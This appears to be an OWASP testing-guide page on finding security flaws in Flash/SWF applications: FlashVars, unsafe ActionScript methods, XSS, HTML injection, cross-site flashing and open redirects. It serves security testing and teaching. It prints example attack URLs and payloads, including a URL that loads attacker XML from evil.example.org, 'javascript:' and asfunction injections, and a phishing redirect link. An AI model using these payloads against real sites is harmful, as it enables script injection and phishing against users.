## Summary

ActionScript is the language, based on ECMAScript, used by Flash
applications when dealing with interactive needs. There are three
versions of the ActionScript language. ActionScript 1.0 and ActionScript
2.0 are very similar with ActionScript 2.0 being an extension of
ActionScript 1.0. ActionScript 3.0, introduced with Flash Player 9, is a
rewrite of the language to support object orientated design.

ActionScript, like every other language, has some implementation
patterns which could lead to security issues. In particular, since Flash
applications are often embedded in browsers, vulnerabilities like DOM
based Cross-Site Scripting (XSS) could be present in flawed Flash
applications.

## How to Test

Since the first publication of "Testing Flash Applications" \[1\], new
versions of Flash player were released in order to mitigate some of the
attacks which will be described. Nevertheless, some issues still remain
exploitable because they are the result of insecure programming
practices.

### Decompilation

Since SWF files are interpreted by a virtual machine embedded in the
player itself, they can be potentially decompiled and analysed. The most
known and free ActionScript 2.0 decompiler is flare.

To decompile a SWF file with flare just type:

`$ flare hello.swf`

it will result in a new file called hello.flr.

Decompilation helps testers because it allows for source code assisted,
or white-box, testing of the Flash applications. HP's free SWFScan tool
can decompile both ActionScript 2.0 and ActionScript 3.0
[SWFScan](https://h30406.www3.hp.com/campaigns/2009/wwcampaign/1-5TUVE/index.php?key=swf)

The [OWASP Flash Security
Project](http://www.owasp.org/index.php/Category:OWASP_Flash_Security_Project)
maintains a list of current disassemblers, decompilers and other Adobe
Flash related testing tools.

### Undefined Variables FlashVars

FlashVars are the variables that the SWF developer planned on receiving
from the web page. FlashVars are typically passed in from the Object or
Embed tag within the HTML. For instance:

    <object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
    codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
     <param name="movie" value="somefilename.swf">
     <param name="FlashVars" value="var1=val1&var2=val2">
     <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
    </embed>
    </object>

FlashVars can also be initialized from the URL:

```
  http://www.example.org/somefilename.swf?var1=val1&var2=val2
```

In ActionScript 3.0, a developer must explicitly assign the FlashVar
values to local variables. Typically, this looks like:

```
 var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
 var var1:String = String(paramObj["var1"]);
 var var2:String = String(paramObj["var2"]);
```

In ActionScript 2.0, any uninitialized global variable is assumed to be
a FlashVar. Global variables are those variables that are prepended by
_root, _global or _level0. This means that if an attribute like:

`_root.varname `

is undefined throughout the code flow, it could be overwritten by
setting

```
 http://victim/file.swf?varname=value
```

Regardless of whether you are looking at ActionScript 2.0 or
ActionScript 3.0, FlashVars can be a vector of attack. Let's look at
some ActionScript 2.0 code that is vulnerable:

Example:

```
  movieClip 328 __Packages.Locale {

    #initclip
      if (!_global.Locale) {
        var v1 = function (on_load) {
          var v5 = new XML();
          var v6 = this;
          v5.onLoad = function (success) {
            if (success) {
              trace('Locale loaded xml');
              var v3 = this.xliff.file.body.$trans_unit;
              var v2 = 0;
              while (v2 < v3.length) {
                Locale.strings[v3[v2]._resname] = v3[v2].source.__text;
                ++v2;
              }
              on_load();
            } else {}
          };
          if (_root.language != undefined) {
            Locale.DEFAULT_LANG = _root.language;
          }
          v5.load(Locale.DEFAULT_LANG + '/player_' +
                              Locale.DEFAULT_LANG + '.xml');
        };
```

The above code could be attacked by requesting:

```
 http://victim/file.swf?language=http://evil.example.org/malicious.xml?
```

### Unsafe Methods

When an entry point is identified, the data it represents could be used
by unsafe methods. If the data is not filtered/validated using the right
regexp it could lead to some security issue.

Unsafe Methods since version r47 are:

    loadVariables()
    loadMovie()
    getURL()
    loadMovie()
    loadMovieNum()
    FScrollPane.loadScrollContent()
    LoadVars.load
    LoadVars.send
    XML.load ( 'url' )
    LoadVars.load ( 'url' )
    Sound.loadSound( 'url' , isStreaming );
    NetStream.play( 'url' );

    flash.external.ExternalInterface.call(_root.callback)

    htmlText

### The Test

In order to exploit a vulnerability, the swf file should be hosted on
the victim's host, and the techniques of reflected XSS must be used.
That is forcing the browser to load a pure swf file directly in the
location bar (by redirection or social engineering) or by loading it
through an iframe from an evil page:

<iframe src='http://victim/path/to/file.swf'></iframe>

This is because in this situation the browser will self-generate an HTML
page as if it were hosted by the victim host.

### XSS

**GetURL (AS2) / NavigateToURL (AS3):**

The GetURL function in ActionScript 2.0 and NavigateToURL in
ActionScript 3.0 lets the movie load a URI into the browser's window.

So if an undefined variable is used as the first argument for getURL:

`getURL(_root.URI,'_targetFrame');`

Or if a FlashVar is used as the parameter that is passed to a
navigateToURL function:

`var request:URLRequest = new URLRequest(FlashVarSuppliedURL);  `
`navigateToURL(request);`

Then this will mean it's possible to call JavaScript in the same domain
where the movie is hosted by requesting:

```
 http://victim/file.swf?URI=javascript:evilcode

 getURL('javascript:evilcode','_self');
```

The same when only some part of getURL is controlled:

```
 Dom Injection with Flash JavaScript injection

    getUrl('javascript:function('+_root.arg+'))
```

**asfunction:**

You can use the special asfunction protocol to cause the link to execute
an ActionScript function in a SWF file instead of opening a URL. Until
release Flash Player 9 r48 asfunction could be used on every method
which has a URL as an argument. After that release, asfunction was
restricted to use within an HTML TextField.

This means that a tester could try to inject:

`asfunction:getURL,javascript:evilcode`

in every unsafe method like:

`loadMovie(_root.URL)`

by requesting:

<http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode>

**ExternalInterface:**

ExternalInterface.call is a static method introduced by Adobe to improve
player/browser interaction for both ActionScript 2.0 and ActionScript
3.0.

From a security point of view it could be abused when part of its
argument could be controlled:

`flash.external.ExternalInterface.call(_root.callback);`

the attack pattern for this kind of flaw should be something like the
following:

`eval(evilcode)`

since the internal JavaScript which is executed by the browser will be
something similar to:

`eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "`<undefined/>`"; }')`

### HTML Injection

TextField Objects can render minimal HTML by setting:

`tf.html = true`
`tf.htmlText = '`<tag>`text`</tag>`'`

So if some part of text could be controlled by the tester, an A tag or
an IMG tag could be injected resulting in modifying the GUI or XSS the
browser.

Some attack examples with A Tag:

  - Direct XSS: <a href='javascript:alert(123)' >

<!-- end list -->

  - Call a function: <a href='asfunction:function,arg' >

<!-- end list -->

  - Call SWF public functions:

`   `<a href='asfunction:_root.obj.function, arg'>

  - Call native static as function:

<a href='asfunction:System.Security.allowDomain,evilhost' >

IMG tag could be used as well:

<img src='http://evil/evil.swf' >
<img src='javascript:evilcode//.swf' >` (.swf is necessary to bypass flash player internal filter)`

Note: since release Flash Player 9.0.124.0 of Flash player XSS is no
longer exploitable, but GUI modification could still be accomplished.

### Cross-Site Flashing

Cross-Site Flashing (XSF) is a vulnerability which has a similar impact
as XSS.

XSF Occurs when from different domains:

  - One Movie loads another Movie with loadMovie\* functions or other
    hacks and has access to the same sandbox or part of it
  - XSF could also occurs when an HTML page uses JavaScript to command
    an Adobe Flash movie, for example, by calling:
      - GetVariable: access to flash public and static object from
        JavaScript as a string.
      - SetVariable: set a static or public flash object to a new string
        value from JavaScript.
  - Unexpected Browser to SWF communication could result in stealing
    data from the SWF application.

It could be performed by forcing a flawed SWF to load an external evil
flash file. This attack could result in XSS or in the modification of
the GUI in order to fool a user to insert credentials on a fake flash
form. XSF could be used in the presence of Flash HTML Injection or
external SWF files when loadMovie\* methods are used.

### Open redirectors

SWFs have the capability to navigate the browser. If the SWF takes the
destination in as a FlashVar, then the SWF may be used as an open
redirector. An open redirector is any piece of website functionality on
a trusted website that an attacker can use to redirect the end-user to a
malicious website. These are frequently used within phishing attacks.
Similar to cross-site scripting, the attack involves a user clicking on
a malicious link.

In the Flash case, the malicious URL might look like:

```
   http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html
```

In the above example, an end-user might see the URL begins with their
favorite trusted website and click on it. The link would load the
trusted SWF which takes the getURLValue and provides it to an
ActionScript browser navigation call:

```
  getURL(_root.getURLValue,"_self");
```

This would navigate the browser to the malicious URL provided by the
attacker. At this point, the phisher has successfully leveraged the
trusted the user has in trusted.example.org to trick the user into their
malicious website. From their, they could launch a 0-day, conduct
spoofing of the original website, or any other type of attack. SWFs may
unintentionally be acting as an open-redirector on the website.

Developers should avoid taking full URLs as FlashVars. If they only plan
to navigate within their own website, then they should use relative URLs
or verify that the URL begins with a trusted domain and protocol.

### Attacks and Flash Player Version

Since May 2007, three new versions of Flash player were released by
Adobe. Every new version restricts some of the attacks previously
described.

    | Attack
    | asfunction
    | ExternalInterface
    | GetURL
    | Html Injection
    |
    | Player Version
    |
    | v9.0 r47/48
    |  Yes
    |   Yes
    | Yes
    |     Yes
    |
    | v9.0 r115
    |  No
    |   Yes
    | Yes
    |     Yes
    |
    | v9.0 r124
    |  No
    |   Yes
    | Yes
    |     Partially
    |

**Result Expected:**
Cross-Site Scripting and Cross-Site Flashing are the expected results on
a flawed SWF file.

## Tools

  - Adobe SWF Investigator:
    <http://labs.adobe.com/technologies/swfinvestigator/>

<!-- end list -->

  - SWFScan:
    <http://h30499.www3.hp.com/t5/Following-the-Wh1t3-Rabbit/SWFScan-FREE-Flash-decompiler/ba-p/5440167>

<!-- end list -->

  - SWFIntruder: <https://www.owasp.org/index.php/Category:SWFIntruder>

<!-- end list -->

  - Decompiler – Flare: <http://www.nowrap.de/flare.html>

<!-- end list -->

  - Compiler – MTASC: <http://www.mtasc.org/>

<!-- end list -->

  - Disassembler – Flasm: <http://flasm.sourceforge.net/>

<!-- end list -->

  - Swfmill – Convert Swf to XML and vice versa: <http://swfmill.org/>

<!-- end list -->

  - Debugger Version of Flash Plugin/Player:
    <http://www.adobe.com/support/flash/downloads.html>

## References

**OWASP**
\* OWASP Flash Security Project: The OWASP Flash Security project has
even more references than what is listed below:
<http://www.owasp.org/index.php/Category:OWASP_Flash_Security_Project>

**Whitepapers**
\* Testing Flash Applications: A new attack vector for XSS and
XSFlashing:
<http://www.owasp.org/images/8/8c/OWASPAppSec2007Milan_TestingFlashApplications.ppt>

  - Finding Vulnerabilities in Flash Applications:
    <http://www.owasp.org/images/d/d8/OWASP-WASCAppSec2007SanJose_FindingVulnsinFlashApps.ppt>

<!-- end list -->

  - Adobe security updates with Flash Player 9,0,124,0 to reduce
    cross-site attacks:
    <http://www.adobe.com/devnet/flashplayer/articles/flash_player9_security_update.html>

<!-- end list -->

  - Securing SWF Applications:
    <http://www.adobe.com/devnet/flashplayer/articles/secure_swf_apps.html>

<!-- end list -->

  - The Flash Player Development Center Security Section:
    <http://www.adobe.com/devnet/flashplayer/security.html>

<!-- end list -->

  - The Flash Player 10.0 Security Whitepaper:
    <http://www.adobe.com/devnet/flashplayer/articles/flash_player10_security_wp.html>